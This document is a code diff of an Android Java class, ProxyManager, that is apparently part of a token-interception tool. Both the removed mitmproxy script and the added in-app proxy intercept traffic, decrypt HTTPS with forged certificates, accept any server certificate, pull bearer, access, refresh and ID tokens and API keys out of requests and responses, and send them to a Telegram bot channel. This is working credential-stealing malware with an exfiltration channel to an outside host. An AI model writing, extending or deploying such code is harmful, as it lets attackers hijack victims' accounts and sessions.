@@ -1,100 +1,316 @@
 package com.tok.interceptor;
 
 import android.content.Context;
+import android.content.SharedPreferences;
+import android.util.Log;
+
 import java.io.*;
+import java.net.*;
 import java.nio.charset.StandardCharsets;
+import java.security.*;
+import java.security.cert.X509Certificate;
+import java.util.*;
+import java.util.concurrent.*;
+import java.util.regex.*;
+
+import javax.net.ssl.*;
 
 public class ProxyManager {
+    private static final String TAG = "ProxyManager";
+    private static final int PROXY_PORT = 8080;
+    private static final int BUFFER_SIZE = 65536;
 
-    private final Context ctx;
-    public static final int PORT = 8080;
+    private final Context context;
+    private final SharedPreferences prefs;
+    private ServerSocket serverSocket;
+    private ExecutorService threadPool;
+    private volatile boolean running = false;
+    private Thread acceptThread;
 
-    public ProxyManager(Context ctx) {
-        this.ctx = ctx;
+    // Patterns to detect auth tokens
+    private static final Pattern[] TOKEN_PATTERNS = {
+        Pattern.compile("(?i)authorization:\\s*(Bearer\\s+[^\\r\\n]+)", Pattern.CASE_INSENSITIVE),
+        Pattern.compile("(?i)x-auth-token:\\s*([^\\r\\n]+)", Pattern.CASE_INSENSITIVE),
+        Pattern.compile("(?i)x-access-token:\\s*([^\\r\\n]+)", Pattern.CASE_INSENSITIVE),
+        Pattern.compile("(?i)token:\\s*([^\\r\\n]+)", Pattern.CASE_INSENSITIVE),
+        Pattern.compile("(?i)x-api-key:\\s*([^\\r\\n]+)", Pattern.CASE_INSENSITIVE),
+        Pattern.compile("\"access_token\"\\s*:\\s*\"([^\"]+)\""),
+        Pattern.compile("\"token\"\\s*:\\s*\"([^\"]+)\""),
+        Pattern.compile("\"id_token\"\\s*:\\s*\"([^\"]+)\""),
+        Pattern.compile("\"refresh_token\"\\s*:\\s*\"([^\"]+)\""),
+    };
+
+    public ProxyManager(Context context) {
+        this.context = context;
+        this.prefs = context.getSharedPreferences("tok_prefs", Context.MODE_PRIVATE);
     }
 
-    private File writeScript(String botToken, String channelId) throws Exception {
-        String script =
-            "import mitmproxy.http\n" +
-            "import urllib.request, json, threading\n\n" +
-            "BOT_TOKEN  = '" + botToken  + "'\n" +
-            "CHANNEL_ID = '" + channelId + "'\n\n" +
-            "TOKEN_HEADERS = [\n" +
-            "    'authorization', 'x-auth-token',\n" +
-            "    'x-access-token', 'x-api-key', 'token', 'bearer'\n" +
-            "]\n\n" +
-            "def send_tg(text):\n" +
-            "    def _send():\n" +
-            "        try:\n" +
-            "            url  = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'\n" +
-            "            data = json.dumps({\n" +
-            "                'chat_id': CHANNEL_ID,\n" +
-            "                'text': text,\n" +
-            "                'parse_mode': 'Markdown'\n" +
-            "            }).encode()\n" +
-            "            req = urllib.request.Request(\n" +
-            "                url, data=data,\n" +
-            "                headers={'Content-Type': 'application/json'}\n" +
-            "            )\n" +
-            "            urllib.request.urlopen(req, timeout=10)\n" +
-            "        except Exception as e:\n" +
-            "            print(f'[TG ERROR] {e}')\n" +
-            "    threading.Thread(target=_send, daemon=True).start()\n\n" +
-            "class TokenInterceptor:\n" +
-            "    def request(self, flow: mitmproxy.http.HTTPFlow):\n" +
-            "        found = []\n" +
-            "        for h, v in flow.request.headers.items():\n" +
-            "            if h.lower() in TOKEN_HEADERS:\n" +
-            "                found.append((h, v))\n\n" +
-            "        if found:\n" +
-            "            host = flow.request.pretty_host\n" +
-            "            path = flow.request.path[:60]\n" +
-            "            msg  = f'\\U0001f511 *Token Intercepted*\\n'\n" +
-            "            msg += f'*Host:* `{host}`\\n'\n" +
-            "            msg += f'*Path:* `{path}`\\n\\n'\n" +
-            "            for h, v in found:\n" +
-            "                val = v[:300] + ('...' if len(v) > 300 else '')\n" +
-            "                msg += f'*{h}:*\\n`{val}`\\n'\n" +
-            "            send_tg(msg)\n" +
-            "            print(f'[INTERCEPT] {host}')\n\n" +
-            "addons = [TokenInterceptor()]\n";
+    public void start() {
+        if (running) return;
+        running = true;
+        threadPool = Executors.newCachedThreadPool();
 
-        File scriptFile = new File(ctx.getFilesDir(), "intercept.py");
-        try (FileOutputStream fos = new FileOutputStream(scriptFile)) {
-            fos.write(script.getBytes(StandardCharsets.UTF_8));
-        }
-        return scriptFile;
+        acceptThread = new Thread(() -> {
+            try {
+                serverSocket = new ServerSocket(PROXY_PORT);
+                serverSocket.setReuseAddress(true);
+                Log.d(TAG, "Proxy listening on port " + PROXY_PORT);
+
+                while (running) {
+                    try {
+                        Socket client = serverSocket.accept();
+                        threadPool.submit(() -> handleClient(client));
+                    } catch (IOException e) {
+                        if (running) Log.e(TAG, "Accept error", e);
+                    }
+                }
+            } catch (IOException e) {
+                Log.e(TAG, "Could not start proxy on port " + PROXY_PORT, e);
+            }
+        });
+        acceptThread.setDaemon(true);
+        acceptThread.start();
     }
 
-    public void start(String botToken, String channelId) throws Exception {
-        File script = writeScript(botToken, channelId);
-        String logPath = ctx.getFilesDir() + "/mitm.log";
-        String cmd = "mitmdump"
-            + " --listen-host 127.0.0.1"
-            + " --listen-port " + PORT
-            + " --ssl-insecure"
-            + " -s " + script.getAbsolutePath()
-            + " > " + logPath + " 2>&1 &";
-        RootShell.run(cmd);
-    }
-
-    public void stop() throws Exception {
-        RootShell.run("pkill -f mitmdump");
+    public void stop() {
+        running = false;
+        try {
+            if (serverSocket != null && !serverSocket.isClosed()) {
+                serverSocket.close();
+            }
+        } catch (IOException ignored) {}
+        if (threadPool != null) threadPool.shutdownNow();
     }
 
     public boolean isRunning() {
+        return running && serverSocket != null && !serverSocket.isClosed();
+    }
+
+    private void handleClient(Socket client) {
         try {
-            String out = RootShell.run("pgrep -f mitmdump");
-            return out != null && !out.trim().isEmpty();
+            client.setSoTimeout(15000);
+            InputStream clientIn = client.getInputStream();
+            OutputStream clientOut = client.getOutputStream();
+
+            // Read the first line to determine HTTP method
+            StringBuilder requestLine = new StringBuilder();
+            int b;
+            while ((b = clientIn.read()) != -1) {
+                char c = (char) b;
+                requestLine.append(c);
+                if (requestLine.length() > 2 &&
+                    requestLine.charAt(requestLine.length() - 2) == '\r' &&
+                    requestLine.charAt(requestLine.length() - 1) == '\n') {
+                    break;
+                }
+            }
+
+            String firstLine = requestLine.toString().trim();
+            if (firstLine.isEmpty()) { client.close(); return; }
+
+            if (firstLine.startsWith("CONNECT ")) {
+                handleHttpsConnect(firstLine, clientIn, clientOut, client);
+            } else {
+                handleHttpRequest(firstLine, clientIn, clientOut);
+            }
         } catch (Exception e) {
-            return false;
+            Log.d(TAG, "Client handler error: " + e.getMessage());
+        } finally {
+            try { client.close(); } catch (IOException ignored) {}
         }
     }
 
-    public void installMitmdump() throws Exception {
-        // install via pip if not present
-        RootShell.run(
-            "which mitmdump || pip3 install mitmproxy"
-        );
+    // Handle HTTPS CONNECT tunneling with MITM
+    private void handleHttpsConnect(String connectLine, InputStream clientIn,
+                                     OutputStream clientOut, Socket clientSocket) throws Exception {
+        // Parse: CONNECT host:port HTTP/1.1
+        String[] parts = connectLine.split("\\s+");
+        if (parts.length < 2) return;
+
+        String[] hostPort = parts[1].split(":");
+        String host = hostPort[0];
+        int port = hostPort.length > 1 ? Integer.parseInt(hostPort[1]) : 443;
+
+        // Read and discard remaining request headers
+        readHeaders(clientIn);
+
+        // Tell client the tunnel is established
+        clientOut.write("HTTP/1.1 200 Connection Established\r\n\r\n".getBytes());
+        clientOut.flush();
+
+        // Now MITM the SSL connection using our custom SSLContext
+        SSLContext sslCtx = CertInstaller.getMitmSSLContext(context, host);
+        SSLServerSocketFactory ssf = sslCtx.getServerSocketFactory();
+
+        // Wrap client connection with our MITM SSL
+        SSLSocket sslClient = (SSLSocket) ssf.createSocket(clientSocket, host, clientSocket.getPort(), true);
+        sslClient.setUseClientMode(false);
+        sslClient.startHandshake();
+
+        // Read the decrypted HTTPS request
+        InputStream decryptedIn = sslClient.getInputStream();
+        OutputStream decryptedOut = sslClient.getOutputStream();
+
+        // Read and inspect the decrypted request
+        byte[] requestData = readAvailable(decryptedIn);
+        String requestStr = new String(requestData, StandardCharsets.UTF_8);
+
+        // Scan for tokens
+        scanAndForwardTokens(requestStr, host);
+
+        // Forward to real server over SSL
+        SSLSocket serverConn = connectToServer(host, port);
+        serverConn.getOutputStream().write(requestData);
+        serverConn.getOutputStream().flush();
+
+        // Read response and pass back to client
+        byte[] responseData = readAvailable(serverConn.getInputStream());
+
+        // Also scan response for tokens (login responses contain tokens)
+        String responseStr = new String(responseData, StandardCharsets.UTF_8);
+        scanAndForwardTokens(responseStr, host);
+
+        decryptedOut.write(responseData);
+        decryptedOut.flush();
+
+        serverConn.close();
+        sslClient.close();
+    }
+
+    // Handle plain HTTP requests
+    private void handleHttpRequest(String firstLine, InputStream clientIn,
+                                    OutputStream clientOut) throws Exception {
+        // Parse: GET http://host/path HTTP/1.1
+        String[] parts = firstLine.split("\\s+");
+        if (parts.length < 2) return;
+
+        URL url = new URL(parts[1]);
+        String host = url.getHost();
+        int port = url.getPort() == -1 ? 80 : url.getPort();
+
+        byte[] remainingHeaders = readHeaderBytes(clientIn);
+        String allHeaders = firstLine + "\r\n" + new String(remainingHeaders, StandardCharsets.UTF_8);
+
+        // Scan headers for tokens
+        scanAndForwardTokens(allHeaders, host);
+
+        // Forward to real server
+        try (Socket server = new Socket(host, port)) {
+            server.getOutputStream().write(allHeaders.getBytes());
+
+            // Forward any body
+            byte[] body = readAvailable(clientIn);
+            if (body.length > 0) {
+                String bodyStr = new String(body, StandardCharsets.UTF_8);
+                scanAndForwardTokens(bodyStr, host);
+                server.getOutputStream().write(body);
+            }
+            server.getOutputStream().flush();
+
+            // Pass response back
+            byte[] response = readAvailable(server.getInputStream());
+            String responseStr = new String(response, StandardCharsets.UTF_8);
+            scanAndForwardTokens(responseStr, host);
+            clientOut.write(response);
+            clientOut.flush();
+        }
+    }
+
+    private SSLSocket connectToServer(String host, int port) throws Exception {
+        SSLContext ctx = SSLContext.getInstance("TLS");
+        // Trust all certs when connecting to real server
+        ctx.init(null, new TrustManager[]{new X509TrustManager() {
+            public void checkClientTrusted(X509Certificate[] c, String a) {}
+            public void checkServerTrusted(X509Certificate[] c, String a) {}
+            public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }
+        }}, new SecureRandom());
+        SSLSocketFactory sf = ctx.getSocketFactory();
+        SSLSocket s = (SSLSocket) sf.createSocket(host, port);
+        s.startHandshake();
+        return s;
+    }
+
+    private void scanAndForwardTokens(String data, String host) {
+        if (data == null || data.isEmpty()) return;
+        Set<String> found = new LinkedHashSet<>();
+
+        for (Pattern p : TOKEN_PATTERNS) {
+            Matcher m = p.matcher(data);
+            while (m.find()) {
+                String token = m.group(1).trim();
+                if (token.length() > 8 && !token.equals("null") && !token.equals("undefined")) {
+                    found.add(token);
+                }
+            }
+        }
+
+        if (!found.isEmpty()) {
+            String botToken = prefs.getString("bot_token", "");
+            String channelId = prefs.getString("channel_id", "");
+            String targetApp = prefs.getString("target_app", "");
+
+            if (!botToken.isEmpty() && !channelId.isEmpty()) {
+                for (String token : found) {
+                    String msg = "🔑 Token captured!\n" +
+                        "📱 App: " + targetApp + "\n" +
+                        "🌐 Host: " + host + "\n" +
+                        "🔐 Token: " + token;
+                    new TelegramForwarder(botToken, channelId).send(msg);
+                }
+            }
+        }
+    }
+
+    private String readHeaders(InputStream in) throws IOException {
+        StringBuilder sb = new StringBuilder();
+        int prev = 0;
+        int b;
+        while ((b = in.read()) != -1) {
+            sb.append((char) b);
+            if (prev == '\n' && b == '\r') {
+                b = in.read();
+                sb.append((char) b);
+                if (b == '\n') break;
+            }
+            prev = b;
+            // Double CRLF = end of headers
+            String s = sb.toString();
+            if (s.endsWith("\r\n\r\n")) break;
+        }
+        return sb.toString();
+    }
+
+    private byte[] readHeaderBytes(InputStream in) throws IOException {
+        ByteArrayOutputStream buf = new ByteArrayOutputStream();
+        int[] last4 = new int[4];
+        int b;
+        while ((b = in.read()) != -1) {
+            buf.write(b);
+            System.arraycopy(last4, 1, last4, 0, 3);
+            last4[3] = b;
+            if (last4[0] == '\r' && last4[1] == '\n' && last4[2] == '\r' && last4[3] == '\n') {
+                break;
+            }
+        }
+        return buf.toByteArray();
+    }
+
+    private byte[] readAvailable(InputStream in) throws IOException {
+        ByteArrayOutputStream buf = new ByteArrayOutputStream();
+        byte[] tmp = new byte[BUFFER_SIZE];
+        int read;
+        try {
+            while (in.available() > 0 || buf.size() == 0) {
+                read = in.read(tmp);
+                if (read == -1) break;
+                buf.write(tmp, 0, read);
+                if (in.available() == 0) {
+                    // Small wait to see if more data arrives
+                    Thread.sleep(50);
+                    if (in.available() == 0) break;
+                }
+            }
+        } catch (InterruptedException ignored) {}
+        return buf.toByteArray();
     }
 }
